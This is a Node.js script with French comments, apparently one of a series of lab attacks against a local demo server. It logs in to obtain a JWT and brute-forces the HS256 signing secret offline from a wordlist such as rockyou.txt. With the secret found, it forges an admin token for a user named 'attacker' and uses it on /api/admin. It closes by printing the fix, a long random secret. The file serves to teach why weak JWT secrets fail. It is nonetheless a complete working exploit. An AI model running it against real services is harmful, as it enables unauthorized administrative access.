/**
 * ATTAQUE 3 — Force brute du secret HS256
 * =========================================
 * Un token JWT signé avec HMAC-SHA256 (HS256) peut être craqué par
 * force brute si le secret est faible. La vérification d'une
 * candidature ne nécessite que le token — aucun appel réseau n'est
 * nécessaire, ce qui rend l'attaque très rapide (offline).
 *
 * Fonctionnement :
 *   Pour chaque mot candidat, on recalcule HMAC-SHA256(header.payload)
 *   avec ce mot comme clé, et on compare à la signature du token.
 *   Si elles correspondent, le secret est trouvé.
 *
 * Capacités GPU modernes (Hashcat) :
 *   MD5    : ~100 milliards de hash/s
 *   HS256  : ~500 millions de hash/s   ← ici
 *   bcrypt : ~20 000 hash/s            ← c'est pour ça qu'on utilise bcrypt
 *
 * Usage :
 *   node attacks/3_brute_force.js
 *   node attacks/3_brute_force.js --wordlist /path/to/rockyou.txt
 */

const crypto = require('crypto');
const fs     = require('fs');
const path   = require('path');

const BASE_URL = 'http://localhost:3000';

// Dictionnaire intégré — inclut "secret" (le vrai secret du serveur)
const BUILT_IN_WORDLIST = [
  'password', '123456', 'admin', 'letmein', 'qwerty', 'abc123',
  'monkey', 'dragon', 'master', 'welcome', 'login', 'pass',
  'test', 'root', 'user', 'key', 'hello', 'world',
  // Candidats spécifiques aux JWT
  'secret', 'mysecret', 'jwt', 'jwtkey', 'jwt_secret', 'secretkey',
  'supersecret', 'token', 'mytoken', 'authkey', 'hmackey',
  // Variantes courantes
  'password1', 'Password1', 'p@ssword', 's3cr3t', 'S3cr3t',
];

function banner(title) {
  console.log('\n' + '─'.repeat(60));
  console.log(' ' + title);
  console.log('─'.repeat(60));
}

/**
 * Vérifie si `candidate` est le secret HMAC d'un token JWT HS256.
 * Ne nécessite aucun appel réseau — entièrement offline.
 */
function tryCandidateSecret(headerB64, payloadB64, tokenSig, candidate) {
  const expected = crypto
    .createHmac('sha256', candidate)
    .update(`${headerB64}.${payloadB64}`)
    .digest('base64url');
  return expected === tokenSig;
}

async function run() {
  banner('ATTAQUE 3 : Force brute du secret HS256 (offline)');

  // Récupération d'un token valide via login légitime
  console.log('\n[1] Obtention d\'un token JWT HS256 valide (login alice)...');
  const loginRes = await fetch(`${BASE_URL}/auth/login`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ username: 'alice', password: 'password123' }),
  });
  const { token } = await loginRes.json();
  console.log('    Token intercepté :', token);

  const parts = token.split('.');
  if (parts.length !== 3) {
    console.error('Format de token inattendu'); process.exit(1);
  }
  const [headerB64, payloadB64, tokenSig] = parts;

  // Choix du dictionnaire
  const args        = process.argv.slice(2);
  const wlIdx       = args.indexOf('--wordlist');
  const wordlistArg = wlIdx !== -1 ? args[wlIdx + 1] : null;

  let wordlist;
  let wordlistName;

  if (wordlistArg && fs.existsSync(wordlistArg)) {
    // Lecture du fichier wordlist ligne par ligne (streaming pour les gros fichiers)
    wordlistName = path.basename(wordlistArg);
    console.log(`\n[2] Dictionnaire externe : ${wordlistArg}`);
    wordlist = null; // sera traité en streaming
  } else {
    wordlistName = 'dictionnaire intégré';
    console.log(`\n[2] Dictionnaire intégré (${BUILT_IN_WORDLIST.length} mots)`);
    wordlist = BUILT_IN_WORDLIST;
  }

  console.log(`\n[3] Démarrage de l'attaque par force brute (${wordlistName})...`);
  console.log('    Header JWT  :', headerB64);
  console.log('    Signature   :', tokenSig);
  console.log();

  const startTime = Date.now();
  let tested = 0;
  let found  = null;

  if (wordlist) {
    // Dictionnaire en mémoire
    for (const word of wordlist) {
      tested++;
      process.stdout.write(`\r    Testé : ${tested.toString().padStart(5)} / ${wordlist.length} — candidat courant : "${word.padEnd(20)}"`);
      if (tryCandidateSecret(headerB64, payloadB64, tokenSig, word)) {
        found = word; break;
      }
    }
    process.stdout.write('\n');
  } else {
    // Dictionnaire en streaming (fichier potentiellement très grand)
    const fileContent = fs.readFileSync(wordlistArg, 'latin1');
    const lines       = fileContent.split('\n');
    for (const line of lines) {
      const word = line.trim();
      if (!word) continue;
      tested++;
      if (tested % 10000 === 0) {
        process.stdout.write(`\r    Testé : ${tested.toLocaleString()} mots...`);
      }
      if (tryCandidateSecret(headerB64, payloadB64, tokenSig, word)) {
        found = word; break;
      }
    }
    process.stdout.write('\n');
  }

  const elapsed = ((Date.now() - startTime) / 1000).toFixed(3);
  const rate    = Math.round(tested / ((Date.now() - startTime) / 1000));

  console.log(`\n    Mots testés : ${tested.toLocaleString()}`);
  console.log(`    Durée       : ${elapsed}s`);
  console.log(`    Débit       : ~${rate.toLocaleString()} hash/s (Node.js mono-thread)`);

  if (found) {
    console.log(`\n✅ SECRET TROUVÉ : "${found}"`);
    console.log('\n[4] Exploitation — forge d\'un token admin avec le secret découvert...');

    function b64Encode(obj) { return Buffer.from(JSON.stringify(obj)).toString('base64url'); }
    const fHeader  = b64Encode({ alg: 'HS256', typ: 'JWT' });
    const fPayload = b64Encode({ username: 'attacker', role: 'admin', iat: Math.floor(Date.now() / 1000) });
    const fSig     = crypto.createHmac('sha256', found).update(`${fHeader}.${fPayload}`).digest('base64url');
    const adminToken = `${fHeader}.${fPayload}.${fSig}`;

    const adminRes = await fetch(`${BASE_URL}/api/admin`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    const adminData = await adminRes.json();
    console.log('    Accès admin :', adminRes.status, JSON.stringify(adminData));
  } else {
    console.log('\n❌ Secret non trouvé dans ce dictionnaire.');
    if (!wordlistArg) console.log('   → Essayez avec rockyou.txt : --wordlist /path/to/rockyou.txt');
  }

  banner('FIN DE L\'ATTAQUE 3');
  console.log('\nCorrection : utiliser un secret aléatoire long (>= 256 bits).');
  console.log('Exemple :  crypto.randomBytes(32).toString("hex")\n');
}

run().catch(err => {
  console.error('\n[ERREUR] :', err.message);
  console.error('→ Assurez-vous que le serveur est lancé : node server.js\n');
  process.exit(1);
});
